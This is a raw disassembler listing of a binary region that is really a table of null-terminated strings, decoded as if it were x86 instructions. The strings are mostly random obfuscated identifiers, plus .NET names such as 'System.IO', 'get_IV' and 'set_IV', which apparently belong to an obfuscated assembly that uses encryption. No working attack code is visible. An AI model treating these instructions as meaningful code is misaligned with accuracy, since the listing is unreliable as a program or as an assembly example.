  407b4f:	6f                   	outsl  %ds:(%esi),(%dx)
  407b50:	42                   	inc    %edx
  407b51:	49                   	dec    %ecx
  407b52:	00 67 65             	add    %ah,0x65(%edi)
  407b55:	74 5f                	je     0x407bb6
  407b57:	41                   	inc    %ecx
  407b58:	53                   	push   %ebx
  407b59:	43                   	inc    %ebx
  407b5a:	49                   	dec    %ecx
  407b5b:	49                   	dec    %ecx
  407b5c:	00 79 46             	add    %bh,0x46(%ecx)
  407b5f:	4b                   	dec    %ebx
  407b60:	45                   	inc    %ebp
  407b61:	46                   	inc    %esi
  407b62:	64 57                	fs push %edi
  407b64:	4b                   	dec    %ebx
  407b65:	51                   	push   %ecx
  407b66:	55                   	push   %ebp
  407b67:	4a                   	dec    %edx
  407b68:	49                   	dec    %ecx
  407b69:	00 70 67             	add    %dh,0x67(%eax)
  407b6c:	71 6b                	jno    0x407bd9
  407b6e:	41                   	inc    %ecx
  407b6f:	6a 6a                	push   $0x6a
  407b71:	59                   	pop    %ecx
  407b72:	58                   	pop    %eax
  407b73:	49                   	dec    %ecx
  407b74:	56                   	push   %esi
  407b75:	61                   	popa
  407b76:	4a                   	dec    %edx
  407b77:	4c                   	dec    %esp
  407b78:	49                   	dec    %ecx
  407b79:	00 6b 75             	add    %ch,0x75(%ebx)
  407b7c:	44                   	inc    %esp
  407b7d:	5a                   	pop    %edx
  407b7e:	71 53                	jno    0x407bd3
  407b80:	57                   	push   %edi
  407b81:	43                   	inc    %ebx
  407b82:	57                   	push   %edi
  407b83:	65 4c                	gs dec %esp
  407b85:	49                   	dec    %ecx
  407b86:	00 4a 48             	add    %cl,0x48(%edx)
  407b89:	58                   	pop    %eax
  407b8a:	67 66 44             	addr16 inc %sp
  407b8d:	63 4d 52             	arpl   %ecx,0x52(%ebp)
  407b90:	49                   	dec    %ecx
  407b91:	00 54 71 77          	add    %dl,0x77(%ecx,%esi,2)
  407b95:	62 61 4b             	bound  %esp,0x4b(%ecx)
  407b98:	54                   	push   %esp
  407b99:	76 4e                	jbe    0x407be9
  407b9b:	6c                   	insb   (%dx),%es:(%edi)
  407b9c:	67 49                	addr16 dec %ecx
  407b9e:	00 54 42 42          	add    %dl,0x42(%edx,%eax,2)
  407ba2:	68 6e 72 63 4f       	push   $0x4f63726e
  407ba7:	73 6c                	jae    0x407c15
  407ba9:	49                   	dec    %ecx
  407baa:	00 4c 42 5a          	add    %cl,0x5a(%edx,%eax,2)
  407bae:	72 63                	jb     0x407c13
  407bb0:	7a 47                	jp     0x407bf9
  407bb2:	44                   	inc    %esp
  407bb3:	73 46                	jae    0x407bfb
  407bb5:	54                   	push   %esp
  407bb6:	73 49                	jae    0x407c01
  407bb8:	00 6b 47             	add    %ch,0x47(%ebx)
  407bbb:	66 51                	push   %cx
  407bbd:	76 68                	jbe    0x407c27
  407bbf:	4e                   	dec    %esi
  407bc0:	79 6a                	jns    0x407c2c
  407bc2:	47                   	inc    %edi
  407bc3:	45                   	inc    %ebp
  407bc4:	50                   	push   %eax
  407bc5:	78 53                	js     0x407c1a
  407bc7:	4a                   	dec    %edx
  407bc8:	00 61 67             	add    %ah,0x67(%ecx)
  407bcb:	51                   	push   %ecx
  407bcc:	75 58                	jne    0x407c26
  407bce:	70 45                	jo     0x407c15
  407bd0:	7a 4c                	jp     0x407c1e
  407bd2:	56                   	push   %esi
  407bd3:	74 63                	je     0x407c38
  407bd5:	4a                   	dec    %edx
  407bd6:	00 48 75             	add    %cl,0x75(%eax)
  407bd9:	79 55                	jns    0x407c30
  407bdb:	5a                   	pop    %edx
  407bdc:	5a                   	pop    %edx
  407bdd:	79 41                	jns    0x407c20
  407bdf:	58                   	pop    %eax
  407be0:	79 76                	jns    0x407c58
  407be2:	56                   	push   %esi
  407be3:	55                   	push   %ebp
  407be4:	68 4a 00 59 49       	push   $0x4959004a
  407be9:	46                   	inc    %esi
  407bea:	4e                   	dec    %esi
  407beb:	6f                   	outsl  %ds:(%esi),(%dx)
  407bec:	6a 62                	push   $0x62
  407bee:	70 42                	jo     0x407c32
  407bf0:	71 4a                	jno    0x407c3c
  407bf2:	00 6b 61             	add    %ch,0x61(%ebx)
  407bf5:	6d                   	insl   (%dx),%es:(%edi)
  407bf6:	47                   	inc    %edi
  407bf7:	4d                   	dec    %ebp
  407bf8:	59                   	pop    %ecx
  407bf9:	67 61                	addr16 popa
  407bfb:	66 68 41 55          	pushw  $0x5541
  407bff:	72 4a                	jb     0x407c4b
  407c01:	00 6d 41             	add    %ch,0x41(%ebp)
  407c04:	75 76                	jne    0x407c7c
  407c06:	4c                   	dec    %esp
  407c07:	74 73                	je     0x407c7c
  407c09:	66 62 51 6c          	bound  %dx,0x6c(%ecx)
  407c0d:	4c                   	dec    %esp
  407c0e:	75 77                	jne    0x407c87
  407c10:	4a                   	dec    %edx
  407c11:	00 71 5a             	add    %dh,0x5a(%ecx)
  407c14:	58                   	pop    %eax
  407c15:	61                   	popa
  407c16:	61                   	popa
  407c17:	43                   	inc    %ebx
  407c18:	51                   	push   %ecx
  407c19:	45                   	inc    %ebp
  407c1a:	76 71                	jbe    0x407c8d
  407c1c:	70 6a                	jo     0x407c88
  407c1e:	42                   	inc    %edx
  407c1f:	4b                   	dec    %ebx
  407c20:	00 61 78             	add    %ah,0x78(%ecx)
  407c23:	6f                   	outsl  %ds:(%esi),(%dx)
  407c24:	48                   	dec    %eax
  407c25:	77 55                	ja     0x407c7c
  407c27:	48                   	dec    %eax
  407c28:	55                   	push   %ebp
  407c29:	62 55 45             	bound  %edx,0x45(%ebp)
  407c2c:	4b                   	dec    %ebx
  407c2d:	00 50 45             	add    %dl,0x45(%eax)
  407c30:	42                   	inc    %edx
  407c31:	45                   	inc    %ebp
  407c32:	57                   	push   %edi
  407c33:	42                   	inc    %edx
  407c34:	4a                   	dec    %edx
  407c35:	4c                   	dec    %esp
  407c36:	58                   	pop    %eax
  407c37:	4f                   	dec    %edi
  407c38:	4d                   	dec    %ebp
  407c39:	4a                   	dec    %edx
  407c3a:	4b                   	dec    %ebx
  407c3b:	00 79 67             	add    %bh,0x67(%ecx)
  407c3e:	4f                   	dec    %edi
  407c3f:	6a 6f                	push   $0x6f
  407c41:	42                   	inc    %edx
  407c42:	4e                   	dec    %esi
  407c43:	74 76                	je     0x407cbb
  407c45:	4d                   	dec    %ebp
  407c46:	4b                   	dec    %ebx
  407c47:	00 4b 57             	add    %cl,0x57(%ebx)
  407c4a:	77 55                	ja     0x407ca1
  407c4c:	70 6d                	jo     0x407cbb
  407c4e:	58                   	pop    %eax
  407c4f:	49                   	dec    %ecx
  407c50:	73 59                	jae    0x407cab
  407c52:	52                   	push   %edx
  407c53:	4b                   	dec    %ebx
  407c54:	00 65 6e             	add    %ah,0x6e(%ebp)
  407c57:	6a 48                	push   $0x48
  407c59:	4a                   	dec    %edx
  407c5a:	52                   	push   %edx
  407c5b:	44                   	inc    %esp
  407c5c:	7a 44                	jp     0x407ca2
  407c5e:	73 61                	jae    0x407cc1
  407c60:	4b                   	dec    %ebx
  407c61:	00 6c 41 77          	add    %ch,0x77(%ecx,%eax,2)
  407c65:	67 79 43             	addr16 jns 0x407cab
  407c68:	68 67 65 6c 6c       	push   $0x6c6c6567
  407c6d:	4b                   	dec    %ebx
  407c6e:	00 58 46             	add    %bl,0x46(%eax)
  407c71:	76 4d                	jbe    0x407cc0
  407c73:	65 46                	gs inc %esi
  407c75:	76 73                	jbe    0x407cea
  407c77:	6c                   	insb   (%dx),%es:(%edi)
  407c78:	54                   	push   %esp
  407c79:	4e                   	dec    %esi
  407c7a:	44                   	inc    %esp
  407c7b:	6e                   	outsb  %ds:(%esi),(%dx)
  407c7c:	4b                   	dec    %ebx
  407c7d:	00 51 4c             	add    %dl,0x4c(%ecx)
  407c80:	57                   	push   %edi
  407c81:	64 76 43             	fs jbe 0x407cc7
  407c84:	4e                   	dec    %esi
  407c85:	5a                   	pop    %edx
  407c86:	4b                   	dec    %ebx
  407c87:	74 44                	je     0x407ccd
  407c89:	76 4b                	jbe    0x407cd6
  407c8b:	00 65 6e             	add    %ah,0x6e(%ebp)
  407c8e:	5a                   	pop    %edx
  407c8f:	5a                   	pop    %edx
  407c90:	5a                   	pop    %edx
  407c91:	50                   	push   %eax
  407c92:	69 55 5a 67 41 4c 00 	imul   $0x4c4167,0x5a(%ebp),%edx
  407c99:	63 47 66             	arpl   %eax,0x66(%edi)
  407c9c:	6d                   	insl   (%dx),%es:(%edi)
  407c9d:	47                   	inc    %edi
  407c9e:	59                   	pop    %ecx
  407c9f:	6f                   	outsl  %ds:(%esi),(%dx)
  407ca0:	69 4c 6f 70 42 44 4c 	imul   $0x4c4442,0x70(%edi,%ebp,2),%ecx
  407ca7:	00 
  407ca8:	44                   	inc    %esp
  407ca9:	69 6a 78 78 74 50 56 	imul   $0x56507478,0x78(%edx),%ebp
  407cb0:	48                   	dec    %eax
  407cb1:	45                   	inc    %ebp
  407cb2:	54                   	push   %esp
  407cb3:	47                   	inc    %edi
  407cb4:	44                   	inc    %esp
  407cb5:	4c                   	dec    %esp
  407cb6:	00 57 42             	add    %dl,0x42(%edi)
  407cb9:	4d                   	dec    %ebp
  407cba:	71 74                	jno    0x407d30
  407cbc:	76 75                	jbe    0x407d33
  407cbe:	53                   	push   %ebx
  407cbf:	58                   	pop    %eax
  407cc0:	51                   	push   %ecx
  407cc1:	49                   	dec    %ecx
  407cc2:	4c                   	dec    %esp
  407cc3:	00 77 50             	add    %dh,0x50(%edi)
  407cc6:	55                   	push   %ebp
  407cc7:	71 78                	jno    0x407d41
  407cc9:	75 43                	jne    0x407d0e
  407ccb:	45                   	inc    %ebp
  407ccc:	46                   	inc    %esi
  407ccd:	49                   	dec    %ecx
  407cce:	4a                   	dec    %edx
  407ccf:	4c                   	dec    %esp
  407cd0:	00 53 4a             	add    %dl,0x4a(%ebx)
  407cd3:	4f                   	dec    %edi
  407cd4:	71 46                	jno    0x407d1c
  407cd6:	69 51 73 6c 68 49 42 	imul   $0x4249686c,0x73(%ecx),%edx
  407cdd:	63 4f 53             	arpl   %ecx,0x53(%edi)
  407ce0:	59                   	pop    %ecx
  407ce1:	51                   	push   %ecx
  407ce2:	4c                   	dec    %esp
  407ce3:	00 71 69             	add    %dh,0x69(%ecx)
  407ce6:	55                   	push   %ebp
  407ce7:	58                   	pop    %eax
  407ce8:	61                   	popa
  407ce9:	77 67                	ja     0x407d52
  407ceb:	44                   	inc    %esp
  407cec:	75 5a                	jne    0x407d48
  407cee:	6e                   	outsb  %ds:(%esi),(%dx)
  407cef:	4e                   	dec    %esi
  407cf0:	52                   	push   %edx
  407cf1:	4c                   	dec    %esp
  407cf2:	00 43 46             	add    %al,0x46(%ebx)
  407cf5:	61                   	popa
  407cf6:	49                   	dec    %ecx
  407cf7:	41                   	inc    %ecx
  407cf8:	64 6a 50             	fs push $0x50
  407cfb:	45                   	inc    %ebp
  407cfc:	63 59 55             	arpl   %ebx,0x55(%ecx)
  407cff:	4c                   	dec    %esp
  407d00:	00 6b 53             	add    %ch,0x53(%ebx)
  407d03:	6f                   	outsl  %ds:(%esi),(%dx)
  407d04:	41                   	inc    %ecx
  407d05:	47                   	inc    %edi
  407d06:	59                   	pop    %ecx
  407d07:	67 4b                	addr16 dec %ebx
  407d09:	59                   	pop    %ecx
  407d0a:	4c                   	dec    %esp
  407d0b:	00 43 55             	add    %al,0x55(%ebx)
  407d0e:	6e                   	outsb  %ds:(%esi),(%dx)
  407d0f:	42                   	inc    %edx
  407d10:	4c                   	dec    %esp
  407d11:	64 47                	fs inc %edi
  407d13:	4e                   	dec    %esi
  407d14:	76 72                	jbe    0x407d88
  407d16:	48                   	dec    %eax
  407d17:	4e                   	dec    %esi
  407d18:	62 4c 00 4f          	bound  %ecx,0x4f(%eax,%eax,1)
  407d1c:	43                   	inc    %ebx
  407d1d:	58                   	pop    %eax
  407d1e:	47                   	inc    %edi
  407d1f:	71 4a                	jno    0x407d6b
  407d21:	59                   	pop    %ecx
  407d22:	79 70                	jns    0x407d94
  407d24:	47                   	inc    %edi
  407d25:	43                   	inc    %ebx
  407d26:	74 4c                	je     0x407d74
  407d28:	00 64 41 61          	add    %ah,0x61(%ecx,%eax,2)
  407d2c:	5a                   	pop    %edx
  407d2d:	47                   	inc    %edi
  407d2e:	43                   	inc    %ebx
  407d2f:	4c                   	dec    %esp
  407d30:	73 74                	jae    0x407da6
  407d32:	43                   	inc    %ebx
  407d33:	4d                   	dec    %ebp
  407d34:	00 4d 72             	add    %cl,0x72(%ebp)
  407d37:	56                   	push   %esi
  407d38:	4f                   	dec    %edi
  407d39:	42                   	inc    %edx
  407d3a:	4c                   	dec    %esp
  407d3b:	64 4f                	fs dec %edi
  407d3d:	47                   	inc    %edi
  407d3e:	42                   	inc    %edx
  407d3f:	4e                   	dec    %esi
  407d40:	00 43 55             	add    %al,0x55(%ebx)
  407d43:	49                   	dec    %ecx
  407d44:	63 47 65             	arpl   %eax,0x65(%edi)
  407d47:	78 42                	js     0x407d8b
  407d49:	4c                   	dec    %esp
  407d4a:	4b                   	dec    %ebx
  407d4b:	43                   	inc    %ebx
  407d4c:	4e                   	dec    %esi
  407d4d:	00 66 4a             	add    %ah,0x4a(%esi)
  407d50:	47                   	inc    %edi
  407d51:	72 72                	jb     0x407dc5
  407d53:	76 48                	jbe    0x407d9d
  407d55:	51                   	push   %ecx
  407d56:	77 44                	ja     0x407d9c
  407d58:	4e                   	dec    %esi
  407d59:	00 4c 6a 5a          	add    %cl,0x5a(%edx,%ebp,2)
  407d5d:	78 49                	js     0x407da8
  407d5f:	6f                   	outsl  %ds:(%esi),(%dx)
  407d60:	46                   	inc    %esi
  407d61:	78 71                	js     0x407dd4
  407d63:	6f                   	outsl  %ds:(%esi),(%dx)
  407d64:	65 79 48             	gs jns 0x407daf
  407d67:	4e                   	dec    %esi
  407d68:	00 77 49             	add    %dh,0x49(%edi)
  407d6b:	6c                   	insb   (%dx),%es:(%edi)
  407d6c:	58                   	pop    %eax
  407d6d:	67 6a 51             	addr16 push $0x51
  407d70:	50                   	push   %eax
  407d71:	74 44                	je     0x407db7
  407d73:	42                   	inc    %edx
  407d74:	4e                   	dec    %esi
  407d75:	4e                   	dec    %esi
  407d76:	00 79 53             	add    %bh,0x53(%ecx)
  407d79:	59                   	pop    %ecx
  407d7a:	51                   	push   %ecx
  407d7b:	50                   	push   %eax
  407d7c:	42                   	inc    %edx
  407d7d:	47                   	inc    %edi
  407d7e:	4e                   	dec    %esi
  407d7f:	41                   	inc    %ecx
  407d80:	59                   	pop    %ecx
  407d81:	6b 71 75 4f          	imul   $0x4f,0x75(%ecx),%esi
  407d85:	4e                   	dec    %esi
  407d86:	4e                   	dec    %esi
  407d87:	00 57 50             	add    %dl,0x50(%edi)
  407d8a:	68 4c 4e 58 74       	push   $0x74584e4c
  407d8f:	4a                   	dec    %edx
  407d90:	77 51                	ja     0x407de3
  407d92:	52                   	push   %edx
  407d93:	4e                   	dec    %esi
  407d94:	00 64 57 54          	add    %ah,0x54(%edi,%edx,2)
  407d98:	6e                   	outsb  %ds:(%esi),(%dx)
  407d99:	63 6a 4f             	arpl   %ebp,0x4f(%edx)
  407d9c:	75 72                	jne    0x407e10
  407d9e:	46                   	inc    %esi
  407d9f:	4b                   	dec    %ebx
  407da0:	65 56                	gs push %esi
  407da2:	4e                   	dec    %esi
  407da3:	00 42 66             	add    %al,0x66(%edx)
  407da6:	41                   	inc    %ecx
  407da7:	49                   	dec    %ecx
  407da8:	42                   	inc    %edx
  407da9:	50                   	push   %eax
  407daa:	52                   	push   %edx
  407dab:	6f                   	outsl  %ds:(%esi),(%dx)
  407dac:	55                   	push   %ebp
  407dad:	7a 6a                	jp     0x407e19
  407daf:	4e                   	dec    %esi
  407db0:	00 4b 76             	add    %cl,0x76(%ebx)
  407db3:	4c                   	dec    %esp
  407db4:	67 4b                	addr16 dec %ebx
  407db6:	47                   	inc    %edi
  407db7:	55                   	push   %ebp
  407db8:	51                   	push   %ecx
  407db9:	76 59                	jbe    0x407e14
  407dbb:	47                   	inc    %edi
  407dbc:	75 72                	jne    0x407e30
  407dbe:	4e                   	dec    %esi
  407dbf:	00 73 6a             	add    %dh,0x6a(%ebx)
  407dc2:	5a                   	pop    %edx
  407dc3:	47                   	inc    %edi
  407dc4:	73 66                	jae    0x407e2c
  407dc6:	74 75                	je     0x407e3d
  407dc8:	74 4e                	je     0x407e18
  407dca:	00 44 58 58          	add    %al,0x58(%eax,%ebx,2)
  407dce:	4e                   	dec    %esi
  407dcf:	79 77                	jns    0x407e48
  407dd1:	73 46                	jae    0x407e19
  407dd3:	49                   	dec    %ecx
  407dd4:	42                   	inc    %edx
  407dd5:	50                   	push   %eax
  407dd6:	6e                   	outsb  %ds:(%esi),(%dx)
  407dd7:	6f                   	outsl  %ds:(%esi),(%dx)
  407dd8:	58                   	pop    %eax
  407dd9:	45                   	inc    %ebp
  407dda:	58                   	pop    %eax
  407ddb:	42                   	inc    %edx
  407ddc:	4f                   	dec    %edi
  407ddd:	00 64 49 45          	add    %ah,0x45(%ecx,%ecx,2)
  407de1:	6b 42 70 6d          	imul   $0x6d,0x70(%edx),%eax
  407de5:	56                   	push   %esi
  407de6:	62 4d 43             	bound  %ecx,0x43(%ebp)
  407de9:	4f                   	dec    %edi
  407dea:	00 53 6e             	add    %dl,0x6e(%ebx)
  407ded:	71 4f                	jno    0x407e3e
  407def:	57                   	push   %edi
  407df0:	44                   	inc    %esp
  407df1:	64 4b                	fs dec %ebx
  407df3:	65 52                	gs push %edx
  407df5:	45                   	inc    %ebp
  407df6:	4f                   	dec    %edi
  407df7:	00 53 79             	add    %dl,0x79(%ebx)
  407dfa:	73 74                	jae    0x407e70
  407dfc:	65 6d                	gs insl (%dx),%es:(%edi)
  407dfe:	2e 49                	cs dec %ecx
  407e00:	4f                   	dec    %edi
  407e01:	00 61 58             	add    %ah,0x58(%ecx)
  407e04:	70 4b                	jo     0x407e51
  407e06:	4c                   	dec    %esp
  407e07:	55                   	push   %ebp
  407e08:	56                   	push   %esi
  407e09:	73 4d                	jae    0x407e58
  407e0b:	73 51                	jae    0x407e5e
  407e0d:	4f                   	dec    %edi
  407e0e:	00 7a 56             	add    %bh,0x56(%edx)
  407e11:	68 72 51 50 49       	push   $0x49505172
  407e16:	5a                   	pop    %edx
  407e17:	55                   	push   %ebp
  407e18:	4f                   	dec    %edi
  407e19:	00 4d 72             	add    %cl,0x72(%ebp)
  407e1c:	63 54 53 4c          	arpl   %edx,0x4c(%ebx,%edx,2)
  407e20:	62 59 43             	bound  %ebx,0x43(%ecx)
  407e23:	59                   	pop    %ecx
  407e24:	56                   	push   %esi
  407e25:	4f                   	dec    %edi
  407e26:	00 55 74             	add    %dl,0x74(%ebp)
  407e29:	59                   	pop    %ecx
  407e2a:	51                   	push   %ecx
  407e2b:	43                   	inc    %ebx
  407e2c:	68 6f 49 74 70       	push   $0x7074496f
  407e31:	45                   	inc    %ebp
  407e32:	4b                   	dec    %ebx
  407e33:	63 4f 00             	arpl   %ecx,0x0(%edi)
  407e36:	69 76 6a 45 6c 71 75 	imul   $0x75716c45,0x6a(%esi),%esi
  407e3d:	47                   	inc    %edi
  407e3e:	76 59                	jbe    0x407e99
  407e40:	62 54 66 77          	bound  %edx,0x77(%esi,%eiz,2)
  407e44:	4f                   	dec    %edi
  407e45:	00 50 50             	add    %dl,0x50(%eax)
  407e48:	45                   	inc    %ebp
  407e49:	74 53                	je     0x407e9e
  407e4b:	4f                   	dec    %edi
  407e4c:	79 74                	jns    0x407ec2
  407e4e:	74 44                	je     0x407e94
  407e50:	50                   	push   %eax
  407e51:	00 51 63             	add    %dl,0x63(%ecx)
  407e54:	67 6b 78 79 4d       	imul   $0x4d,0x79(%bx,%si),%edi
  407e59:	44                   	inc    %esp
  407e5a:	49                   	dec    %ecx
  407e5b:	42                   	inc    %edx
  407e5c:	4b                   	dec    %ebx
  407e5d:	4b                   	dec    %ebx
  407e5e:	76 66                	jbe    0x407ec6
  407e60:	47                   	inc    %edi
  407e61:	50                   	push   %eax
  407e62:	00 71 7a             	add    %dh,0x7a(%ecx)
  407e65:	76 44                	jbe    0x407eab
  407e67:	70 62                	jo     0x407ecb
  407e69:	46                   	inc    %esi
  407e6a:	6f                   	outsl  %ds:(%esi),(%dx)
  407e6b:	45                   	inc    %ebp
  407e6c:	64 67 6b 4d 50 00    	imul   $0x0,%fs:0x50(%di),%ecx
  407e72:	49                   	dec    %ecx
  407e73:	6a 69                	push   $0x69
  407e75:	61                   	popa
  407e76:	66 69 67 64 46 46    	imul   $0x4646,0x64(%edi),%sp
  407e7c:	4e                   	dec    %esi
  407e7d:	50                   	push   %eax
  407e7e:	00 58 58             	add    %bl,0x58(%eax)
  407e81:	4a                   	dec    %edx
  407e82:	6e                   	outsb  %ds:(%esi),(%dx)
  407e83:	41                   	inc    %ecx
  407e84:	7a 4c                	jp     0x407ed2
  407e86:	4a                   	dec    %edx
  407e87:	56                   	push   %esi
  407e88:	63 50 00             	arpl   %edx,0x0(%eax)
  407e8b:	4e                   	dec    %esi
  407e8c:	4d                   	dec    %ebp
  407e8d:	6d                   	insl   (%dx),%es:(%edi)
  407e8e:	43                   	inc    %ebx
  407e8f:	4b                   	dec    %ebx
  407e90:	61                   	popa
  407e91:	42                   	inc    %edx
  407e92:	4a                   	dec    %edx
  407e93:	47                   	inc    %edi
  407e94:	74 50                	je     0x407ee6
  407e96:	00 72 45             	add    %dh,0x45(%edx)
  407e99:	79 69                	jns    0x407f04
  407e9b:	6a 47                	push   $0x47
  407e9d:	54                   	push   %esp
  407e9e:	66 51                	push   %cx
  407ea0:	51                   	push   %ecx
  407ea1:	00 70 6e             	add    %dh,0x6e(%eax)
  407ea4:	50                   	push   %eax
  407ea5:	76 6d                	jbe    0x407f14
  407ea7:	64 64 52             	fs fs push %edx
  407eaa:	72 44                	jb     0x407ef0
  407eac:	77 42                	ja     0x407ef0
  407eae:	41                   	inc    %ecx
  407eaf:	67 51                	addr16 push %ecx
  407eb1:	00 6c 44 4a          	add    %ch,0x4a(%esp,%eax,2)
  407eb5:	62 46 41             	bound  %eax,0x41(%esi)
  407eb8:	69 57 47 67 51 00 52 	imul   $0x52005167,0x47(%edi),%edx
  407ebf:	42                   	inc    %edx
  407ec0:	4f                   	dec    %edi
  407ec1:	51                   	push   %ecx
  407ec2:	48                   	dec    %eax
  407ec3:	71 6e                	jno    0x407f33
  407ec5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ec6:	4c                   	dec    %esp
  407ec7:	73 43                	jae    0x407f0c
  407ec9:	4d                   	dec    %ebp
  407eca:	46                   	inc    %esi
  407ecb:	72 51                	jb     0x407f1e
  407ecd:	00 59 71             	add    %bl,0x71(%ecx)
  407ed0:	51                   	push   %ecx
  407ed1:	69 45 7a 46 59 54 74 	imul   $0x74545946,0x7a(%ebp),%eax
  407ed8:	51                   	push   %ecx
  407ed9:	00 4a 58             	add    %cl,0x58(%edx)
  407edc:	66 65 4a             	gs dec %dx
  407edf:	72 53                	jb     0x407f34
  407ee1:	51                   	push   %ecx
  407ee2:	44                   	inc    %esp
  407ee3:	52                   	push   %edx
  407ee4:	00 55 52             	add    %dl,0x52(%ebp)
  407ee7:	66 71 47             	data16 jno 0x407f31
  407eea:	73 67                	jae    0x407f53
  407eec:	4f                   	dec    %edi
  407eed:	47                   	inc    %edi
  407eee:	77 70                	ja     0x407f60
  407ef0:	46                   	inc    %esi
  407ef1:	52                   	push   %edx
  407ef2:	00 52 52             	add    %dl,0x52(%edx)
  407ef5:	4b                   	dec    %ebx
  407ef6:	62 43 78             	bound  %eax,0x78(%ebx)
  407ef9:	5a                   	pop    %edx
  407efa:	41                   	inc    %ecx
  407efb:	70 64                	jo     0x407f61
  407efd:	52                   	push   %edx
  407efe:	00 65 4b             	add    %ah,0x4b(%ebp)
  407f01:	58                   	pop    %eax
  407f02:	62 6f 70             	bound  %ebp,0x70(%edi)
  407f05:	59                   	pop    %ecx
  407f06:	4d                   	dec    %ebp
  407f07:	6d                   	insl   (%dx),%es:(%edi)
  407f08:	7a 58                	jp     0x407f62
  407f0a:	75 73                	jne    0x407f7f
  407f0c:	52                   	push   %edx
  407f0d:	00 4b 42             	add    %cl,0x42(%ebx)
  407f10:	61                   	popa
  407f11:	65 73 41             	gs jae 0x407f55
  407f14:	65 64 49             	gs fs dec %ecx
  407f17:	54                   	push   %esp
  407f18:	4f                   	dec    %edi
  407f19:	76 52                	jbe    0x407f6d
  407f1b:	00 74 42 4c          	add    %dh,0x4c(%edx,%eax,2)
  407f1f:	4e                   	dec    %esi
  407f20:	61                   	popa
  407f21:	65 44                	gs inc %esp
  407f23:	72 68                	jb     0x407f8d
  407f25:	49                   	dec    %ecx
  407f26:	70 77                	jo     0x407f9f
  407f28:	52                   	push   %edx
  407f29:	00 4e 4f             	add    %cl,0x4f(%esi)
  407f2c:	75 41                	jne    0x407f6f
  407f2e:	68 48 61 7a 51       	push   $0x517a6148
  407f33:	6d                   	insl   (%dx),%es:(%edi)
  407f34:	6f                   	outsl  %ds:(%esi),(%dx)
  407f35:	73 77                	jae    0x407fae
  407f37:	46                   	inc    %esi
  407f38:	53                   	push   %ebx
  407f39:	00 69 58             	add    %ch,0x58(%ecx)
  407f3c:	42                   	inc    %edx
  407f3d:	72 41                	jb     0x407f80
  407f3f:	4b                   	dec    %ebx
  407f40:	62 6a 6c             	bound  %ebp,0x6c(%edx)
  407f43:	45                   	inc    %ebp
  407f44:	64 4d                	fs dec %ebp
  407f46:	53                   	push   %ebx
  407f47:	00 6c 49 47          	add    %ch,0x47(%ecx,%ecx,2)
  407f4b:	52                   	push   %edx
  407f4c:	45                   	inc    %ebp
  407f4d:	6b 42 4d 50          	imul   $0x50,0x4d(%edx),%eax
  407f51:	4a                   	dec    %edx
  407f52:	58                   	pop    %eax
  407f53:	51                   	push   %ecx
  407f54:	53                   	push   %ebx
  407f55:	00 53 67             	add    %dl,0x67(%ebx)
  407f58:	78 73                	js     0x407fcd
  407f5a:	4b                   	dec    %ebx
  407f5b:	74 76                	je     0x407fd3
  407f5d:	50                   	push   %eax
  407f5e:	7a 73                	jp     0x407fd3
  407f60:	5a                   	pop    %edx
  407f61:	49                   	dec    %ecx
  407f62:	54                   	push   %esp
  407f63:	00 51 53             	add    %dl,0x53(%ecx)
  407f66:	6a 6a                	push   $0x6a
  407f68:	62 58 55             	bound  %ebx,0x55(%eax)
  407f6b:	6f                   	outsl  %ds:(%esi),(%dx)
  407f6c:	46                   	inc    %esi
  407f6d:	62 46 63             	bound  %eax,0x63(%esi)
  407f70:	4a                   	dec    %edx
  407f71:	54                   	push   %esp
  407f72:	00 64 4f 48          	add    %ah,0x48(%edi,%ecx,2)
  407f76:	57                   	push   %edi
  407f77:	44                   	inc    %esp
  407f78:	7a 64                	jp     0x407fde
  407f7a:	73 66                	jae    0x407fe2
  407f7c:	5a                   	pop    %edx
  407f7d:	54                   	push   %esp
  407f7e:	00 59 6a             	add    %bl,0x6a(%ecx)
  407f81:	51                   	push   %ecx
  407f82:	6f                   	outsl  %ds:(%esi),(%dx)
  407f83:	62 68 74             	bound  %ebp,0x74(%eax)
  407f86:	68 64 75 6b 72       	push   $0x726b7564
  407f8b:	64 4a                	fs dec %edx
  407f8d:	55                   	push   %ebp
  407f8e:	00 6b 6f             	add    %ch,0x6f(%ebx)
  407f91:	54                   	push   %esp
  407f92:	75 5a                	jne    0x407fee
  407f94:	42                   	inc    %edx
  407f95:	4e                   	dec    %esi
  407f96:	64 76 48             	fs jbe 0x407fe1
  407f99:	6b 6a 69 7a          	imul   $0x7a,0x69(%edx),%ebp
  407f9d:	46                   	inc    %esi
  407f9e:	63 52 55             	arpl   %edx,0x55(%edx)
  407fa1:	00 53 44             	add    %dl,0x44(%ebx)
  407fa4:	59                   	pop    %ecx
  407fa5:	41                   	inc    %ecx
  407fa6:	4f                   	dec    %edi
  407fa7:	59                   	pop    %ecx
  407fa8:	47                   	inc    %edi
  407fa9:	43                   	inc    %ebx
  407faa:	6a 57                	push   $0x57
  407fac:	49                   	dec    %ecx
  407fad:	49                   	dec    %ecx
  407fae:	4c                   	dec    %esp
  407faf:	43                   	inc    %ebx
  407fb0:	7a 62                	jp     0x408014
  407fb2:	55                   	push   %ebp
  407fb3:	00 51 76             	add    %dl,0x76(%ecx)
  407fb6:	7a 42                	jp     0x407ffa
  407fb8:	47                   	inc    %edi
  407fb9:	58                   	pop    %eax
  407fba:	45                   	inc    %ebp
  407fbb:	6e                   	outsb  %ds:(%esi),(%dx)
  407fbc:	41                   	inc    %ecx
  407fbd:	45                   	inc    %ebp
  407fbe:	66 55                	push   %bp
  407fc0:	00 62 76             	add    %ah,0x76(%edx)
  407fc3:	6a 50                	push   $0x50
  407fc5:	6b 56 4c 4c          	imul   $0x4c,0x4c(%esi),%edx
  407fc9:	59                   	pop    %ecx
  407fca:	68 59 72 77 55       	push   $0x55777259
  407fcf:	00 4b 79             	add    %cl,0x79(%ebx)
  407fd2:	7a 49                	jp     0x40801d
  407fd4:	4b                   	dec    %ebx
  407fd5:	55                   	push   %ebp
  407fd6:	4d                   	dec    %ebp
  407fd7:	48                   	dec    %eax
  407fd8:	6c                   	insb   (%dx),%es:(%edi)
  407fd9:	64 41                	fs inc %ecx
  407fdb:	54                   	push   %esp
  407fdc:	47                   	inc    %edi
  407fdd:	56                   	push   %esi
  407fde:	00 67 65             	add    %ah,0x65(%edi)
  407fe1:	74 5f                	je     0x408042
  407fe3:	49                   	dec    %ecx
  407fe4:	56                   	push   %esi
  407fe5:	00 73 65             	add    %dh,0x65(%ebx)
  407fe8:	74 5f                	je     0x408049
  407fea:	49                   	dec    %ecx
  407feb:	56                   	push   %esi
